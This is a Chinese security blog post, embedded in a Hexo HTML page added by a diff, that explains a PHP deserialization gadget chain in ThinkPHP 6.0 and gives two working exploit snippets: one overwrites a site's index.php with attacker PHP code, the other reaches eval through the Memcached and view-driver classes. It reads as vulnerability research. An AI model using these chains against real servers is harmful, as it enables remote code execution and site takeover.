@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="ThinkPHP6.0 反序列化利用链0x00 预先观察首先全局搜索__destruct，得到以下结果  分别进入类中观察。 ###AbstractCache 首先为AbstractCache，这是Cache的抽象类。  这个地方调用了继承类的save()方法。 AbstractFtpAdapter 这个地方调用了继承类的disconnect()方法。 SafeStorage Connection">
+<meta name="keywords" content="thinkphp,0day">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP6.0反序列化利用链">
+<meta property="og:url" content="http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/index.html">
+<meta property="og:site_name" content="Sndav&#39;s Blog">
+<meta property="og:description" content="ThinkPHP6.0 反序列化利用链0x00 预先观察首先全局搜索__destruct，得到以下结果  分别进入类中观察。 ###AbstractCache 首先为AbstractCache，这是Cache的抽象类。  这个地方调用了继承类的save()方法。 AbstractFtpAdapter 这个地方调用了继承类的disconnect()方法。 SafeStorage Connection">
+<meta property="og:locale" content="zh-Hasn">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819883272_13bef37ba3_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819377363_5ae579f9fe_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819389103_1d64c3079c_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819751711_99596bc9c4_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819753091_035b8110ce_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819398383_01633a74f9_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48819410298_1f6154028a_o.png">
+<meta property="og:updated_time" content="2019-11-22T03:02:20.051Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP6.0反序列化利用链">
+<meta name="twitter:description" content="ThinkPHP6.0 反序列化利用链0x00 预先观察首先全局搜索__destruct，得到以下结果  分别进入类中观察。 ###AbstractCache 首先为AbstractCache，这是Cache的抽象类。  这个地方调用了继承类的save()方法。 AbstractFtpAdapter 这个地方调用了继承类的disconnect()方法。 SafeStorage Connection">
+<meta name="twitter:image" content="https://live.staticflickr.com/65535/48819883272_13bef37ba3_o.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ThinkPHP6.0反序列化利用链</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/09/01/Pwn堆学习-day1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&text=ThinkPHP6.0反序列化利用链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&is_video=false&description=ThinkPHP6.0反序列化利用链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ThinkPHP6.0反序列化利用链&body=Check out this article: http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&title=ThinkPHP6.0反序列化利用链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&name=ThinkPHP6.0反序列化利用链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP6-0-反序列化利用链"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP6.0 反序列化利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-预先观察"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 预先观察</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractFtpAdapter"><span class="toc-number">1.1.1.</span> <span class="toc-text">AbstractFtpAdapter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SafeStorage"><span class="toc-number">1.1.2.</span> <span class="toc-text">SafeStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connection"><span class="toc-number">1.1.3.</span> <span class="toc-text">Connection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Model"><span class="toc-number">1.1.4.</span> <span class="toc-text">Model</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任意文件写造成RCE"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 任意文件写造成RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-任意代码执行RCE"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 任意代码执行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-总结"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ThinkPHP6.0反序列化利用链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Sndav's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-30T08:43:38.000Z" itemprop="datePublished">2019-09-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/0day/">0day</a>, <a class="tag-link" href="/tags/thinkphp/">thinkphp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="ThinkPHP6-0-反序列化利用链"><a href="#ThinkPHP6-0-反序列化利用链" class="headerlink" title="ThinkPHP6.0 反序列化利用链"></a>ThinkPHP6.0 反序列化利用链</h1><h2 id="0x00-预先观察"><a href="#0x00-预先观察" class="headerlink" title="0x00 预先观察"></a>0x00 预先观察</h2><p>首先全局搜索<code>__destruct</code>，得到以下结果</p>
+<p><img src="https://live.staticflickr.com/65535/48819883272_13bef37ba3_o.png" alt="image-20190930164936721"></p>
+<p>分别进入类中观察。</p>
+<p>###AbstractCache</p>
+<p>首先为<code>AbstractCache</code>，这是<code>Cache</code>的抽象类。</p>
+<p><img src="https://live.staticflickr.com/65535/48819377363_5ae579f9fe_o.png" alt="image-20190930165115067"></p>
+<p>这个地方调用了继承类的<code>save()</code>方法。</p>
+<h3 id="AbstractFtpAdapter"><a href="#AbstractFtpAdapter" class="headerlink" title="AbstractFtpAdapter"></a>AbstractFtpAdapter</h3><p><img src="https://live.staticflickr.com/65535/48819389103_1d64c3079c_o.png" alt="image-20190930165431991"></p>
+<p>这个地方调用了继承类的<code>disconnect()</code>方法。</p>
+<h3 id="SafeStorage"><a href="#SafeStorage" class="headerlink" title="SafeStorage"></a>SafeStorage</h3><p><img src="https://live.staticflickr.com/65535/48819751711_99596bc9c4_o.png" alt="image-20190930165538174"></p>
+<h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><p><img src="https://live.staticflickr.com/65535/48819753091_035b8110ce_o.png" alt="image-20190930165558809"></p>
+<h3 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h3><p><img src="https://live.staticflickr.com/65535/48819398383_01633a74f9_o.png" alt="image-20190930165701534"></p>
+<p>这篇文章，我们只考虑<code>AbstractCache</code>中的问题。其余类读者可以自行探索</p>
+<h2 id="0x01-任意文件写造成RCE"><a href="#0x01-任意文件写造成RCE" class="headerlink" title="0x01 任意文件写造成RCE"></a>0x01 任意文件写造成RCE</h2><p>我们搜索<code>AbstractCache</code>，找到其继承它的子类。</p>
+<p><img src="https://live.staticflickr.com/65535/48819410298_1f6154028a_o.png" alt="image-20190930170013223"></p>
+<p>这里我们看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $config = <span class="keyword">new</span> Config();</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;adapter-&gt;has(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adapter-&gt;update(<span class="keyword">$this</span>-&gt;file, $contents, $config);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adapter-&gt;write(<span class="keyword">$this</span>-&gt;file, $contents, $config);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>$this-&gt;getForStorage();</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line">    <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete, <span class="keyword">$this</span>-&gt;expire]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以通过控制<code>$this-&gt;cache</code>进而控制其返回值，Easy。</p>
+<p>之后我们的关注点放到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;adapter-&gt;has</span><br><span class="line"><span class="keyword">$this</span>-&gt;adapter-&gt;update</span><br><span class="line"><span class="keyword">$this</span>-&gt;adapter-&gt;write</span><br></pre></td></tr></table></figure>
+<p>此处的<code>$this-&gt;adapter</code>是我们可以随意控制的，这就是问题产生的地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span> <span class="keyword">extends</span> <span class="title">AbstractAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $location = <span class="keyword">$this</span>-&gt;applyPathPrefix($path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file_exists($location);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">.......</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($path, $contents, Config $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $location = <span class="keyword">$this</span>-&gt;applyPathPrefix($path);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ensureDirectory(dirname($location));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($size = file_put_contents($location, $contents, <span class="keyword">$this</span>-&gt;writeFlags)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $type = <span class="string">'file'</span>;</span><br><span class="line">        $result = compact(<span class="string">'contents'</span>, <span class="string">'type'</span>, <span class="string">'size'</span>, <span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($visibility = $config-&gt;get(<span class="string">'visibility'</span>)) &#123;</span><br><span class="line">            $result[<span class="string">'visibility'</span>] = $visibility;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setVisibility($path, $visibility);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">........</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($path, $contents, Config $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $location = <span class="keyword">$this</span>-&gt;applyPathPrefix($path);</span><br><span class="line">        $size = file_put_contents($location, $contents, <span class="keyword">$this</span>-&gt;writeFlags);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($size === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $type = <span class="string">'file'</span>;</span><br><span class="line"></span><br><span class="line">        $result = compact(<span class="string">'type'</span>, <span class="string">'path'</span>, <span class="string">'size'</span>, <span class="string">'contents'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($mimetype = $config-&gt;get(<span class="string">'mimetype'</span>) ?: Util::guessMimeType($path, $contents)) &#123;</span><br><span class="line">            $result[<span class="string">'mimetype'</span>] = $mimetype;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到<code>update/write</code>中的<code>file_put_contents</code>，任意文件写Get</p>
+<p>exp，为了方便调试我将一些属性设置为了public，不过没关系。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$local = <span class="keyword">new</span> \League\Flysystem\Adapter\Local(<span class="string">"/var/www/html/public"</span>);</span><br><span class="line">$adpter = <span class="keyword">new</span> \League\Flysystem\Cached\Storage\Adapter($local,<span class="string">"/index.php"</span>);</span><br><span class="line">$adpter-&gt;cache = [<span class="string">"&lt;?php phpinfo();?&gt;"</span>];</span><br><span class="line">$adpter-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">var_dump(serialize($adpter));</span><br><span class="line">var_dump($adpter-&gt;__destruct());</span><br></pre></td></tr></table></figure>
+<p>之后会将<code>index.php</code> 覆盖。如果想使用追加，可以设置<code>$this-&gt;writeFlags</code></p>
+<h2 id="0x02-任意代码执行RCE"><a href="#0x02-任意代码执行RCE" class="headerlink" title="0x02 任意代码执行RCE"></a>0x02 任意代码执行RCE</h2><p>相同的过程，我们注意到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhpRedis</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;client-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expire !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;client-&gt;expire(<span class="keyword">$this</span>-&gt;key, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>又是这东西，Easy。Set函数查找一下。</p>
+<p>看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> <span class="keyword">extends</span> <span class="title">Driver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $key    = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $value  = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handler-&gt;set($key, $value, $expire)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中这个<code>$this-&gt;serialize($value);</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> (string) $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>][<span class="number">0</span>] ?? <span class="string">"\Opis\Closure\serialize"</span>;</span><br><span class="line">    <span class="keyword">return</span> $serialize($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到<code>$serialize($data);</code>现在的问题是这个<code>$serialize</code>用什么？我们在<code>\think\view\driver\Php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(string $content, array $data = [])</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content = $content;</span><br><span class="line"></span><br><span class="line">    extract($data, EXTR_OVERWRITE);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再根据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abc</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="keyword">new</span> abc,<span class="string">'a'</span>]();</span><br></pre></td></tr></table></figure>
+<p>特性。RCE,GET!</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$Memcached = <span class="keyword">new</span> \think\cache\Driver\Memcached();</span><br><span class="line">$app = \think\App::getInstance();</span><br><span class="line">$Memcached-&gt;options[<span class="string">'serialize'</span>][<span class="number">0</span>] = [ <span class="keyword">new</span> \think\view\driver\Php($app),<span class="string">"display"</span>];</span><br><span class="line">$redis = <span class="keyword">new</span> \League\Flysystem\Cached\Storage\PhpRedis($Memcached);</span><br><span class="line">$redis-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$redis-&gt;cache = [<span class="string">"&lt;?php phpinfo();?&gt;"</span>];</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>反序列化漏洞寻找起来比较枯燥，只要用心就可</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP6-0-反序列化利用链"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP6.0 反序列化利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-预先观察"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 预先观察</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractFtpAdapter"><span class="toc-number">1.1.1.</span> <span class="toc-text">AbstractFtpAdapter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SafeStorage"><span class="toc-number">1.1.2.</span> <span class="toc-text">SafeStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connection"><span class="toc-number">1.1.3.</span> <span class="toc-text">Connection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Model"><span class="toc-number">1.1.4.</span> <span class="toc-text">Model</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任意文件写造成RCE"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 任意文件写造成RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-任意代码执行RCE"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 任意代码执行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-总结"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http:/blog.boyblog.club/2019/09/30/ThinkPHP6-0反序列化利用链/&text=ThinkPHP6.0反序列化利用链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
